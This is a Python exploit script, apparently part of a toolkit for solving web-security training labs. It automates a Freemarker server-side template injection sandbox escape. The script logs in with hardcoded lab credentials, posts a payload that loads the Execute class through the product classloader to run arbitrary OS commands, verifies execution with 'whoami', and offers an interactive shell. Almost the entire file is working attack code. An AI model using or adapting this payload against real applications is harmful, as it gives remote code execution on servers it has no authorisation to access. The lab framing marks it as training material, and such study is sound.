from base_scenario import BaseLabScenario
from urllib.parse import urljoin, quote
from bs4 import BeautifulSoup
import requests  # For standalone execution

# ANSI Color Codes
COLOR_RED = "\033[91m"
COLOR_GREEN = "\033[92m"
COLOR_YELLOW = "\033[93m"
COLOR_BLUE = "\033[94m"
COLOR_MAGENTA = "\033[95m"
COLOR_CYAN = "\033[96m"
COLOR_WHITE = "\033[97m"
COLOR_RESET = "\033[0m"

class Scenario6(BaseLabScenario):
    """Interactive shell for SSTI in sandboxed environment"""
    
    def __init__(self, target_url, session):  # Updated signature
        super().__init__(target_url, session)
        self.product_id = "1"

    @classmethod
    def detect(cls, response_text):
        """Check if this is Scenario 6 by identifying text"""
        return "Server-side template injection in a sandboxed environment" in response_text
    
    def lab_name(self):
        return "Server-side template injection in sandboxed environment (Scenario 6)"

    def execute_command(self, command):
        """Execute commands using Freemarker SSTI"""
        try:
            csrf_token = self.get_template_csrf()
            if not csrf_token:
                return None

            # Format payload with user command
            payload = f"""<#assign classloader=product.class.protectionDomain.classLoader>
<#assign owc=classloader.loadClass("freemarker.template.ObjectWrapper")>
<#assign dwf=owc.getField("DEFAULT_WRAPPER").get(null)>
<#assign ec=classloader.loadClass("freemarker.template.utility.Execute")>
${{dwf.newInstance(ec,null)("{command}")}}"""
            
            response = self.session.post(
                urljoin(self.target_url, f"/product/template?productId={self.product_id}"),
                data={
                    "csrf": csrf_token,
                    "template": payload,
                    "template-action": "preview"
                }
            )
            
            return self._extract_output(response.text)
            
        except Exception as e:
            print(f"{COLOR_RED}[-] Execution error: {str(e)}{COLOR_RESET}")
            return None

    def _extract_output(self, response_text):
        """Extract command output from response"""
        soup = BeautifulSoup(response_text, 'html.parser')
        preview_div = soup.find('div', {'id': 'preview-result'})
        return preview_div.text.strip() if preview_div else None

    def get_template_csrf(self):
        """Get CSRF token from template page"""
        try:
            response = self.session.get(
                urljoin(self.target_url, f"/product/template?productId={self.product_id}")
            )
            return self.get_csrf_token(response.text)
        except Exception as e:
            print(f"{COLOR_RED}[-] CSRF fetch failed: {str(e)}{COLOR_RESET}")
            return None

    def exploit(self):
        """Verify exploit capability and prepare shell"""
        try:
            if not self.login("content-manager", "C0nt3ntM4n4g3r"):
                return False
            
            # Verify command execution
            test_result = self.execute_command("whoami")
            if test_result and "carlos" in test_result:
                print(f"{COLOR_GREEN}[+] Sandbox escape verified{COLOR_RESET}")
                return True
                
            print(f"{COLOR_RED}[-] Initial command execution failed{COLOR_RESET}")
            return False
        except Exception as e:
            print(f"{COLOR_RED}[-] Exploit failed: {str(e)}{COLOR_RESET}")
            return False

if __name__ == "__main__":
    import argparse
    
    parser = argparse.ArgumentParser(description="SSTI Scenario 6 Interactive Shell")
    parser.add_argument("url", help="Target lab URL")
    parser.add_argument("--proxy", help="Proxy server (ip:port)", default=None)
    parser.add_argument("--shell", action="store_true", help="Start interactive shell")
    
    args = parser.parse_args()
    
    # Configure session with proxy
    session = requests.Session()
    session.verify = False
    if args.proxy:
        proxy = args.proxy if args.proxy.startswith(('http://', 'https://')) else f"http://{args.proxy}"
        session.proxies = {'http': proxy, 'https': proxy}
    
    print("\n=== Starting SSTI Shell ===")
    exploiter = Scenario6(args.url.strip(), session)
    
    if exploiter.exploit() and args.shell:
        exploiter.interactive_shell()
